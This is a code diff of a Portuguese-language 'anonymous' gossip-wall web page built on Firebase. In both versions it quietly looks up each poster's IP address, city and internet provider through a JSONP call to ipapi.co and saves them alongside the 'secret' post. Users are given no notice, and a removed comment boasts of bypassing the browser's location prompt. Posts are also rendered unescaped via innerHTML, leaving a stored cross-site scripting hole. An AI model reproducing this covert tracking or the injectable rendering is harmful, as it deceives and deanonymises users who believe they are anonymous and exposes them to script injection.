@@ -9,11 +9,11 @@
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore-compat.js"></script>
 
     <style>
-        :root { --deep-black: #050505; --glow: rgba(255, 255, 255, 0.6); }
+        :root { --deep-black: #050505; }
         
         body { 
             margin: 0; background-color: var(--deep-black); color: #ddd; 
-            font-family: 'Courier New', monospace; overflow-x: hidden;
+            font-family: 'Courier New', monospace; overflow: hidden; height: 100vh;
         }
 
         /* Efeito de Névoa Animada */
@@ -24,44 +24,36 @@
         .fog {
             position: absolute; width: 200%; height: 100%;
             background: url('https://www.transparenttextures.com/patterns/smoke.png');
-            opacity: 0.2; animation: moveFog 40s linear infinite;
+            opacity: 0.2; animation: moveFog 50s linear infinite;
         }
         @keyframes moveFog { from { transform: translateX(0); } to { transform: translateX(-50%); } }
 
-        /* Fundo com Rosto de Anônimo */
+        /* Fundo com Máscara e Título */
         .hero { 
-            height: 55vh; display: flex; flex-direction: column; 
+            height: 45vh; display: flex; flex-direction: column; 
             justify-content: center; align-items: center; text-align: center;
-            background: url('https://images.unsplash.com/photo-1550751827-4bd374c3f58b?q=80&w=2070&auto=format&fit=crop') no-repeat center;
+            background: url('https://images.unsplash.com/photo-1550751827-4bd374c3f58b?q=80&w=1000&auto=format&fit=crop') no-repeat center;
             background-size: contain;
         }
+        .hero h1 { font-size: 5rem; margin: 0; color: #fff; letter-spacing: 15px; text-shadow: 0 0 15px #fff; }
 
-        .hero h1 { font-size: 5.5rem; margin: 0; color: #fff; letter-spacing: 15px; text-shadow: 0 0 15px var(--glow); }
-        .hero p { color: #888; font-style: italic; }
-
-        /* Interface Principal */
+        /* Telas */
         #login-screen { display: flex; justify-content: center; padding: 40px; }
-        #feed-container { display: none; padding: 20px; max-width: 600px; margin: auto; }
+        #feed-container { display: none; padding: 20px; max-width: 600px; margin: auto; overflow-y: auto; height: 50vh; }
 
         .btn-enter { 
             background: transparent; color: white; padding: 15px 40px; 
-            border: 1px solid #555; cursor: pointer; transition: 0.4s;
+            border: 1px solid #555; cursor: pointer; text-transform: uppercase;
         }
         .btn-enter:hover { background: white; color: black; box-shadow: 0 0 20px white; }
 
-        .input-box { background: rgba(10, 10, 10, 0.9); padding: 20px; border: 1px solid #333; margin-bottom: 25px; backdrop-filter: blur(10px); }
+        .input-box { background: rgba(15, 15, 15, 0.9); padding: 20px; border: 1px solid #333; margin-bottom: 20px; backdrop-filter: blur(10px); }
         textarea { width: 100%; background: transparent; border: none; color: #fff; font-size: 1.1rem; outline: none; resize: none; }
         
-        .btn-post { 
-            background: #222; color: #fff; border: 1px solid #444; 
-            padding: 10px 25px; float: right; cursor: pointer;
-        }
-        .btn-post:disabled { opacity: 0.3; cursor: not-allowed; }
+        .btn-post { background: #222; color: #fff; border: 1px solid #444; padding: 10px 25px; float: right; cursor: pointer; }
+        .btn-post:disabled { opacity: 0.3; cursor: wait; }
 
-        .fofoca-card { 
-            background: rgba(15, 15, 15, 0.8); padding: 15px; 
-            margin-bottom: 12px; border-left: 2px solid #fff;
-        }
+        .fofoca-card { background: rgba(20, 20, 20, 0.8); padding: 15px; margin-bottom: 10px; border-left: 2px solid #fff; }
     </style>
 </head>
 <body>
@@ -74,12 +66,12 @@
     </header>
 
     <div id="login-screen">
-        <button class="btn-enter" onclick="entrarNoMural()">ACEDER AO MURAL</button>
+        <button class="btn-enter" onclick="entrar()">ACEDER AO MURAL</button>
     </div>
 
     <div id="feed-container">
         <div class="input-box">
-            <textarea id="fofocaInput" rows="3" placeholder="Qual o seu segredo, Anônimo?"></textarea>
+            <textarea id="fofocaInput" rows="3" placeholder="Sussurre aqui..."></textarea>
             <button class="btn-post" id="btnEnviar" onclick="enviarFofoca()">SOLTAR O VERBO</button>
             <div style="clear: both;"></div>
         </div>
@@ -87,7 +79,6 @@
     </div>
 
     <script>
-        // CONFIGURAÇÃO DO FIREBASE (SUBSTITUA SE NECESSÁRIO)
         var firebaseConfig = {
             apiKey: "AIzaSyC_RKEhHxEvgDN0w7X1AMAwE0a4ljiSbh4",
             authDomain: "xoxo-fofocas.firebaseapp.com",
@@ -97,17 +88,15 @@
             appId: "1:730968176054:web:fcabf0465b189fddbdbd17",
             measurementId: "G-3DZPC3E7SV"
         };
-
         firebase.initializeApp(firebaseConfig);
         var db = firebase.firestore();
 
-        function entrarNoMural() {
+        function entrar() {
             document.getElementById('login-screen').style.display = 'none';
             document.getElementById('feed-container').style.display = 'block';
             carregarFofocas();
         }
 
-        // FUNÇÃO DE RASTREIO DE IP (JSONP)
         function enviarFofoca() {
             const input = document.getElementById('fofocaInput');
             const btn = document.getElementById('btnEnviar');
@@ -117,36 +106,42 @@
             btn.disabled = true;
             btn.innerText = "RASTREANDO...";
 
-            // Criar script de captura (Pula o bloqueio de Localização)
-            const script = document.createElement('script');
-            script.src = 'https://ipapi.co/jsonp/callback=salvarComIP';
-            
-            // Plano B caso a API falhe em 3 seg
-            const timeout = setTimeout(() => {
-                salvarNoFirebase(texto, { erro: "Rastreio Offline" });
-            }, 3000);
+            let finalizado = false;
 
-            window.salvarComIP = function(data) {
-                clearTimeout(timeout);
-                salvarNoFirebase(texto, {
-                    ip: data.ip || "0.0.0.0",
-                    wifi: data.org || "Desconhecido",
-                    cidade: data.city || "Desconhecida"
-                });
+            // Segurança: Se em 2 segundos a API de IP não responder, manda sem rastro para não travar
+            const timeout = setTimeout(() => {
+                if (!finalizado) {
+                    finalizado = true;
+                    gravarFirebase(texto, { status: "Rastreio Offline" });
+                }
+            }, 2000);
+
+            // Captura de IP via JSONP
+            window.processarIP = function(data) {
+                if (!finalizado) {
+                    finalizado = true;
+                    clearTimeout(timeout);
+                    gravarFirebase(texto, {
+                        ip: data.ip || "0.0.0.0",
+                        cidade: data.city || "Desconhecida",
+                        provedor: data.org || "Não identificado"
+                    });
+                }
             };
 
+            const script = document.createElement('script');
+            script.src = 'https://ipapi.co/jsonp/callback=processarIP';
             document.body.appendChild(script);
         }
 
-        function salvarNoFirebase(texto, rastro) {
+        function gravarFirebase(texto, rastro) {
             db.collection("fofocas").add({
                 conteudo: texto,
                 data: firebase.firestore.FieldValue.serverTimestamp(),
-                rastro: rastro,
-                plataforma: navigator.platform
+                rastro: rastro
             }).then(() => {
                 document.getElementById('fofocaInput').value = "";
-                alert("Segredo guardado com rastro de IP.");
+                alert("Segredo enviado!");
             }).finally(() => {
                 const btn = document.getElementById('btnEnviar');
                 btn.disabled = false;
@@ -161,8 +156,7 @@
                 const mural = document.getElementById('mural');
                 mural.innerHTML = "";
                 snap.forEach(doc => {
-                    const f = doc.data();
-                    mural.innerHTML += <div class="fofoca-card"><small style="color:#555">📢 Alguém disse:</small><p>${f.conteudo}</p></div>;
+                    mural.innerHTML += <div class="fofoca-card"><p>${doc.data().conteudo}</p></div>;
                 });
             });
         }
